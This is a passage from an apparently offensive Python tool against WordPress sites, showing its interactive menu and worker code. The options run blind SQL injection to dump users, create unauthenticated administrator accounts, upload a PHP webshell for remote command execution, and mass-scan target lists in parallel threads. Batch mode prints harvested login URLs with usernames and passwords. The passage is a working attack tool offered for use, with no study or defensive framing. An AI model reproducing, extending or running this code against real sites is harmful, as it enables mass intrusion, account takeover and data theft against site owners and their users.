    variant  = _iask_choice("Confusion carrier variant", ["posts", "categories"], "posts")

    def _run_one(url: str) -> int:
        class _A: pass
        a = _A()
        a.url = url; a.preset = preset; a.query = query              # type: ignore[attr-defined]
        a.output = outfile                                            # type: ignore[attr-defined]
        a.prefix = prefix; a.max_length = max_len; a.sqlite = sqlite  # type: ignore[attr-defined]
        a.sleep = sleep; a.variant = variant                          # type: ignore[attr-defined]
        a.timeout = http.timeout; a.proxy = http.proxy                # type: ignore[attr-defined]
        a.insecure = http.insecure; a.header = []                     # type: ignore[attr-defined]
        a.user_agent = http.user_agent; a.retries = http.retries      # type: ignore[attr-defined]
        a.delay = http.delay; a.rest_route = False                     # type: ignore[attr-defined]
        return cmd_read(a)

    _iprint()
    if len(targets) == 1:
        return _run_one(targets[0])
    info(f"Running READ against {len(targets)} targets with {threads} thread(s)...")
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = {ex.submit(_run_one, u): u for u in targets}
        for f in as_completed(futs):
            try:
                f.result()
            except Exception as exc:
                bad(f"{futs[f]}: {exc}")
    return 0


def _imenu_shell(targets: List[str], threads: int, http: HttpConfig,
                 outfile=None) -> int:
    _iheader("SHELL — RCE via webshell plugin upload")
    _iprint(f"  {_ired('This operation uploads a PHP plugin to the target.')}")
    if not _iask_bool("Proceed?", False):
        info("Aborted.")
        return 0

    use_creds = _iask_bool("Supply existing admin credentials?", False)
    user: Optional[str]     = None
    password: Optional[str] = None
    if use_creds:
        user     = _iask("Admin username")
        password = _iask("Admin password")

    run_cmd  = _iask("OS command to run (blank = interactive shell)", "id")
    interact = _iask_bool("Open interactive shell after command?", False)
    sleep    = _iask_float("SLEEP() delay for time-based fallback (s)", 8.0)
    prefix   = _iask("Table prefix for time-based extraction", "wp_")
    variant  = _iask_choice("Confusion carrier variant", ["posts", "categories"], "posts")

    def _run_one(url: str) -> int:
        class _A: pass
        a = _A()
        a.url = url; a.user = user; a.password = password          # type: ignore[attr-defined]
        a.cmd = run_cmd or None; a.interactive = interact           # type: ignore[attr-defined]
        a.output = outfile                                           # type: ignore[attr-defined]
        a.sleep = sleep; a.prefix = prefix; a.variant = variant    # type: ignore[attr-defined]
        a.timeout = http.timeout; a.proxy = http.proxy              # type: ignore[attr-defined]
        a.insecure = http.insecure; a.header = []                   # type: ignore[attr-defined]
        a.user_agent = http.user_agent; a.retries = http.retries    # type: ignore[attr-defined]
        a.delay = http.delay; a.rest_route = False                   # type: ignore[attr-defined]
        if not a.cmd:
            a.interactive = True
        return cmd_shell(a)

    _iprint()
    if len(targets) == 1:
        return _run_one(targets[0])
    info(f"Running SHELL against {len(targets)} targets with {threads} thread(s)...")
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = {ex.submit(_run_one, u): u for u in targets}
        for f in as_completed(futs):
            try:
                f.result()
            except Exception as exc:
                bad(f"{futs[f]}: {exc}")
    return 0


def _imenu_sqli(targets: List[str], threads: int, http: HttpConfig,
                outfile=None) -> int:
    _iheader("SQLI — facilitated sink (e.g. WordPress 6.8.x)")
    endpoint      = _iask("Facilitating sink path (e.g. /?wp2shell_faccheck=1)")
    param         = _iask("Parameter name reaching author__not_in", "author_not_in")
    true_contains = _iask("Response substring present only on true (blank = time-based)", "")
    sleep         = _iask_float("SLEEP() delay for time-based mode (s)", 3.0)
    preset_raw    = _iask_choice("Preset", ["fingerprint", "users", "custom"], "fingerprint")
    query: Optional[str] = None
    preset = preset_raw
    if preset_raw == "custom":
        query  = _iask("SQL scalar expression")
        preset = "fingerprint"
    prefix  = _iask("Table prefix", "wp_")
    max_len = _iask_int("Max chars per extracted value", 128)
    sqlite  = _iask_bool("SQLite target?", False)

    def _run_one(url: str) -> int:
        class _A: pass
        a = _A()
        a.url = url; a.endpoint = endpoint; a.param = param              # type: ignore[attr-defined]
        a.true_contains = true_contains or None                           # type: ignore[attr-defined]
        a.sleep = sleep; a.preset = preset; a.query = query              # type: ignore[attr-defined]
        a.prefix = prefix; a.max_length = max_len; a.sqlite = sqlite     # type: ignore[attr-defined]
        a.timeout = http.timeout; a.proxy = http.proxy                    # type: ignore[attr-defined]
        a.insecure = http.insecure; a.header = []                         # type: ignore[attr-defined]
        a.user_agent = http.user_agent; a.retries = http.retries          # type: ignore[attr-defined]
        a.delay = http.delay                                               # type: ignore[attr-defined]
        return cmd_sqli(a)

    _iprint()
    if len(targets) == 1:
        return _run_one(targets[0])
    info(f"Running SQLI against {len(targets)} targets with {threads} thread(s)...")
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = {ex.submit(_run_one, u): u for u in targets}
        for f in as_completed(futs):
            try:
                f.result()
            except Exception as exc:
                bad(f"{futs[f]}: {exc}")
    return 0


def _imenu_scan(targets: List[str], threads: int, http: HttpConfig,
                outfile=None) -> int:
    _iheader("SCAN — threaded vulnerability scan")
    # targets already loaded; allow overriding with a different file
    alt = _iask(
        f"Press Enter to use current {len(targets)} target(s), "
        "or type a different .txt file / URL", "")
    if alt:
        targets = _load_targets(alt)
        if not targets:
            bad("No URLs found.")
            return 1
    threads = _iask_int("Worker threads", threads)
    sleep   = _iask_float("Confirmation SLEEP delay (s)", 3.0)
    prove   = _iask_bool("Extract @@version as proof on hits?", False)
    jfile   = _iask("JSON report output file (blank = skip)", "")
    variant = _iask_choice("Confusion carrier variant", ["posts", "categories"], "posts")

    class _A: pass
    a = _A()
    # cmd_scan expects a.target as a string (URL or filename); pass first URL
    # but pre-load by writing a temp in-memory list — reuse _load_targets later.
    a.target  = targets[0] if len(targets) == 1 else targets   # type: ignore[attr-defined]
    a.threads = threads; a.sleep = sleep                        # type: ignore[attr-defined]
    a.prove   = prove; a.json = jfile or None; a.variant = variant  # type: ignore[attr-defined]
    a.timeout = http.timeout; a.proxy = http.proxy              # type: ignore[attr-defined]
    a.insecure = http.insecure; a.header = []                   # type: ignore[attr-defined]
    a.user_agent = http.user_agent; a.retries = http.retries    # type: ignore[attr-defined]
    a.delay = http.delay                                         # type: ignore[attr-defined]
    _iprint()

    # Run directly with the already-resolved targets list
    if not targets:
        bad("no targets"); return 1
    hc = http
    _init_conn_sem(min(int(threads * 1.5) + 1, 150))
    info(f"Scanning {len(targets)} target(s) with {threads} thread(s)"
         + (" [--prove: extracting @@version on hits]" if prove else "") + " ...")

    hc_ver = HttpConfig(
        timeout=min(hc.timeout, 8.0), proxy=hc.proxy, insecure=hc.insecure,
        headers=hc.headers, user_agent=hc.user_agent, retries=1, delay=hc.delay)

    def _one(url: str) -> dict:
        rec: Dict[str, Any] = {"url": url}
        try:
            ver = detect_version(url, hc_ver)
            rec["version"] = ".".join(map(str, ver)) if ver else None
            client = BatchClient(url, http=hc, variant=variant)
            if client.probe().status != 207:
                rec["status"] = "no-batch-endpoint"; return rec
            sqli = BlindSQLi(client, sleep=sleep)
            if sqli.confirm():
                rec["status"] = "VULNERABLE"
                if prove:
                    rec["proof_db_version"] = sqli.extract(
                        "SELECT @@version", max_length=64)
            else:
                rec["status"] = (
                    "confusion" if client.confusion_markers() else "safe")
        except Exception as exc:
            rec["status"] = "error"; rec["error"] = str(exc)[:120]
        return rec

    results: List[dict] = []
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = {ex.submit(_one, u): u for u in targets}
        for i, f in enumerate(as_completed(futs), 1):
            r   = f.result()
            results.append(r)
            tag = {"VULNERABLE": _paint("31", "VULNERABLE"),
                   "safe":       _paint("32", "safe"),
                   "confusion":  _paint("33", "confusion-only")}.get(
                r.get("status", ""), r.get("status", "?"))
            extra = f"  db={r['proof_db_version']}" if r.get("proof_db_version") else ""
            print(f"[{i}/{len(targets)}] {r['url']}  "
                  f"[{r.get('version') or '?'}]  {tag}{extra}")

    if jfile:
        with open(jfile, "w", encoding="utf-8") as fh:
            json.dump(results, fh, indent=2)
        good(f"JSON report written to {jfile}")
    vuln = sum(1 for r in results if r.get("status") == "VULNERABLE")
    info(f"Done — {vuln}/{len(results)} vulnerable")
    return 0


def _imenu_settings(http: HttpConfig) -> HttpConfig:
    _iheader("TRANSPORT SETTINGS")
    timeout  = _iask_float("Request timeout (s)", http.timeout)
    proxy    = _iask("Proxy URL (blank = none)", http.proxy or "")
    insecure = _iask_bool("Skip TLS verification?", http.insecure)
    delay    = _iask_float("Delay between requests (s)", http.delay)
    retries  = _iask_int("Connection retries", http.retries)
    return HttpConfig(
        timeout    = timeout,
        proxy      = proxy or None,
        insecure   = insecure,
        delay      = delay,
        retries    = retries,
        user_agent = http.user_agent,
    )


def _imenu_create_admin(targets: List[str], threads: int, http: HttpConfig,
                        outfile=None) -> int:
    _iheader("CREATE ADMIN — Pre-Auth Admin RCE Chain")
    _iprint(f"  {_iyellow('⚠')}  Unauthenticated UNION SQLi → new WordPress administrator.")
    _iprint(f"  {_iyellow('⚠')}  No password cracking. No webshell. Non-destructive admin only.")
    _iprint()
    sqlite  = _iask_bool("Target uses SQLite? (WP-SQLite plugin)", False)
    verify  = _iask_bool("Verify the generated credentials by logging in?", True)
    if outfile is None:
        raw = _iask("Output file (blank = skip, e.g. result.txt)", "")
        outfile = raw.strip() or None
    variant = _iask_choice("Confusion carrier variant", ["posts", "categories"], "posts")
    _iprint()

    # ── single target → full verbose output ──────────────────────────────────
    if len(targets) == 1:
        class _A: pass
        a = _A()
        a.url = targets[0]; a.verify = verify                         # type: ignore[attr-defined]
        a.output = outfile                                             # type: ignore[attr-defined]
        a.sqlite = sqlite; a.variant = variant; a.rest_route = False   # type: ignore[attr-defined]
        a.timeout = http.timeout; a.proxy = http.proxy                 # type: ignore[attr-defined]
        a.insecure = http.insecure; a.header = []                      # type: ignore[attr-defined]
        a.user_agent = http.user_agent; a.retries = http.retries       # type: ignore[attr-defined]
        a.delay = http.delay                                            # type: ignore[attr-defined]
        return cmd_create_admin(a)

    # ── multiple targets → quiet parallel mode, one line per result ──────────
    info(f"Running CREATE-ADMIN on {len(targets)} targets "
         f"[threads={threads}] — output suppressed, results printed on completion.")
    _iprint()

    def _worker(url: str) -> Dict[str, Any]:
        return _batch_create_one(
            url, http,
            sqlite=sqlite, variant=variant,
            verify=verify, outfile=outfile or None)

    done = 0
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = {ex.submit(_worker, u): u for u in targets}
        for f in as_completed(futs):
            done += 1
            try:
                r = f.result()
            except Exception as exc:
                host = urllib.parse.urlsplit(futs[f]).netloc
                print(_paint("31", f"[-] {host} — failed ({exc})"))
                continue

            url = r["url"].rstrip("/")
            if not r["ok"]:
                host = urllib.parse.urlsplit(url).netloc
                err  = r.get("error", "unknown error")
                print(_paint("31", f"[-] {host} — failed ({err})"))
            else:
                user  = r["username"]
                pwd   = r["password"]
                tag   = (_paint("32", "checked")
                         if r["verified"]
                         else _paint("33", "not checked"))
                line  = f"{url}/wp-login.php#{user}@{pwd}"
                print(_paint("32", f"[+] ") + f"{line} {tag}")
    _iprint()
    info(f"Done — {done}/{len(targets)} processed.")
    return 0


# NOTE: colour helpers (_ired etc.) are called lazily inside _ishow_menu so
# that _COLOR is already resolved by the time they run.
_MENU_ITEMS = [
    ("1", "check",        "Fingerprint + confirm vulnerability (non-destructive)"),
    ("2", "read",         "Blind SQL extraction  (fingerprint / dump users)"),
    ("3", "create-admin", None),   # label built dynamically (coloured)
    ("4", "shell",        "Full RCE chain  →  admin creation + webshell"),
    ("5", "sqli",         "Facilitated sink SQLi  (WordPress 6.8.x / custom)"),
    ("6", "scan",         "Threaded scan over URL list"),
    ("7", "settings",     "Transport settings  (proxy, TLS, timeout, delay)"),
    ("8", "url",          "Change target URL"),
    ("0", "quit",         "Quit"),
]


def _ishow_menu(targets: List[str], threads: int, http: HttpConfig,
                outfile=None) -> None:
    _iprint()
    _ihline()
    if len(targets) == 1:
        print(f"  {_ibold('TARGET')}   {_icyan(targets[0])}")
    else:
        print(f"  {_ibold('TARGETS')}  {_icyan(str(len(targets)) + ' URLs')}  "
              f"{_idim('threads=' + str(threads))}")
        for u in targets[:5]:
            print(f"  {_idim('  · ' + u)}")
        if len(targets) > 5:
            print(f"  {_idim(f'  … and {len(targets)-5} more')}")
    extras = []
    if http.proxy:
        extras.append(f"proxy={http.proxy}")
    if http.insecure:
        extras.append("insecure")
    if http.delay:
        extras.append(f"delay={http.delay}s")
    if extras:
        print(f"  {_idim('  ' + '  '.join(extras))}")
    if outfile:
        print(f"  {_ibold('OUTPUT')}   {_igreen(outfile)}")
    _ihline()
    for key, slug, desc in _MENU_ITEMS:
        num = _ibold(f"[{key}]")
        # Option 3 has a dynamically coloured label
        if slug == "create-admin":
            label = (_ired("Pre-Auth Admin creation") +
                     "  " + _idim("(UNION SQLi → new admin account, no webshell)"))
        else:
            label = desc or slug
        print(f"  {num}  {label}")
    _ihline()


def _interactive_main() -> int:
    """Full interactive menu-driven UI — invoked when no CLI arguments are given."""
    _ibanner()

    # ── Ask for target list file (or a single URL) ────────────────────────────
    targets: List[str] = []
    list_src = ""
    while not targets:
        list_src = _iask(
            "Target list file (e.g. list.txt) or single URL",
            "list.txt")
        if list_src.startswith(("http://", "https://")):
            targets = [list_src]
        elif not list_src.startswith(("http://", "https://")) and \
                not list_src.endswith(".txt") and "." in list_src.split("/")[-1]:
            # looks like a bare host
            targets = ["http://" + list_src]
        else:
            try:
                with open(list_src, encoding="utf-8", errors="replace") as fh:
                    targets = [ln.strip() for ln in fh
                               if ln.strip() and not ln.startswith("#")]
                if not targets:
                    print(f"  {_ired(f'No URLs found in {list_src}.')}")
            except (FileNotFoundError, IsADirectoryError, OSError) as exc:
                # If user typed something that doesn't look like a file,
                # treat it as a bare URL
                if not list_src.endswith(".txt"):
                    targets = ["http://" + list_src]
                else:
                    print(f"  {_ired(f'Cannot open {list_src}: {exc}')}")

        # Normalise – prepend http:// to bare hosts
        targets = [
            u if u.startswith(("http://", "https://")) else "http://" + u
            for u in targets
        ]

    if targets:
        good(f"Loaded {len(targets)} target(s)")
        for u in targets[:5]:
            print(f"  {_idim('  · ' + u)}")
        if len(targets) > 5:
            print(f"  {_idim(f'  … and {len(targets)-5} more')}")

    # ── Ask for thread count ──────────────────────────────────────────────────
    threads = _iask_int(
        f"Worker threads (applied when running against all {len(targets)} target(s))",
        min(len(targets), 10))
    # Initialise the connection semaphore once for the whole interactive session.
    # Individual menu actions may re-initialise it if their thread count differs.
    _init_conn_sem(min(int(threads * 1.5) + 1, 150))

    # ── Ask for global output file ONCE ─────────────────────────────────
    _raw = _iask(
        "Output file for ALL results (blank = no file, e.g. result.txt)", "")
    global_outfile = _raw.strip() or None
    if global_outfile:
        good(f"All credentials will be appended to: {global_outfile}")

    http = HttpConfig()

    while True:
        _ishow_menu(targets, threads, http, global_outfile)
        try:
            choice = input(f"\n  {_icyan('→')} Select option: ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            choice = "0"

        if choice == "0":
            _iprint()
            print(f"  {_idim('Goodbye.')}")
            _iprint()
            return 0

        if choice == "8":
            # Change target list / URL
            new_src = _iask(
                "New list.txt path or single URL",
                list_src if list_src else targets[0])
            if new_src:
                new_targets: List[str] = []
                if new_src.startswith(("http://", "https://")):
                    new_targets = [new_src]
                else:
                    try:
                        with open(new_src, encoding="utf-8", errors="replace") as fh:
                            new_targets = [ln.strip() for ln in fh
                                           if ln.strip() and not ln.startswith("#")]
                    except (FileNotFoundError, OSError):
                        new_targets = ["http://" + new_src]
                if new_targets:
                    targets = [
                        u if u.startswith(("http://", "https://")) else "http://" + u
                        for u in new_targets
                    ]
                    list_src = new_src
                    threads = _iask_int(
                        f"Worker threads for {len(targets)} target(s)", threads)
                    good(f"Updated to {len(targets)} target(s)")
            continue

        if choice == "7":
            http = _imenu_settings(http)
            continue

        try:
            if choice == "1":
                _imenu_check(targets, threads, http, global_outfile)
            elif choice == "2":
                _imenu_read(targets, threads, http, global_outfile)
            elif choice == "3":
                _imenu_create_admin(targets, threads, http, global_outfile)
            elif choice == "4":
                _imenu_shell(targets, threads, http, global_outfile)
            elif choice == "5":
                _imenu_sqli(targets, threads, http, global_outfile)
            elif choice == "6":
                _imenu_scan(targets, threads, http, global_outfile)
            else:
                print(f"  {_ired('Unknown option.')} Enter a number from the menu.")
                continue
        except KeyboardInterrupt:
            _iprint()
            warn("Interrupted — returning to menu.")
        except TargetError as exc:
            bad(f"Network error: {exc}")
        except Exception as exc:
            bad(f"Unexpected error: {exc}")

        _iprint()
        input(f"  {_idim('Press Enter to return to the menu...')}")


def main(argv: Optional[list] = None) -> int:
    # No CLI arguments → launch interactive menu
    effective = argv if argv is not None else sys.argv[1:]
    if not effective:
        return _interactive_main()

    args = build_parser().parse_args(argv)
    global _COLOR
    if getattr(args, "no_color", False):
        _COLOR = False
    elif sys.platform == "win32":
        # Re-attempt ANSI enable after argument parsing (in case --no-color
        # overrides it) so colours work on Windows Server 2016+ / Win10+.
        if not _try_enable_windows_ansi():
            _COLOR = False   # disable gracefully on Server 2012 / older

    # ── Initialise connection semaphore ──────────────────────────────────────
    # Set cap = threads × 1.5 (headroom for retries) capped at 150.
    # Defaults: scan uses a.threads, other commands use 1 (serial).
    n_threads = getattr(args, "threads", 1)
    _init_conn_sem(min(int(n_threads * 1.5) + 1, 150))

    if _TTY:
        _tprint(_paint("36", BANNER))
    try:
        return args.func(args)
    except KeyboardInterrupt:
        return 130
    except Exception as exc:
        bad(str(exc))
        return 1


if __name__ == "__main__":
    sys.exit(main())
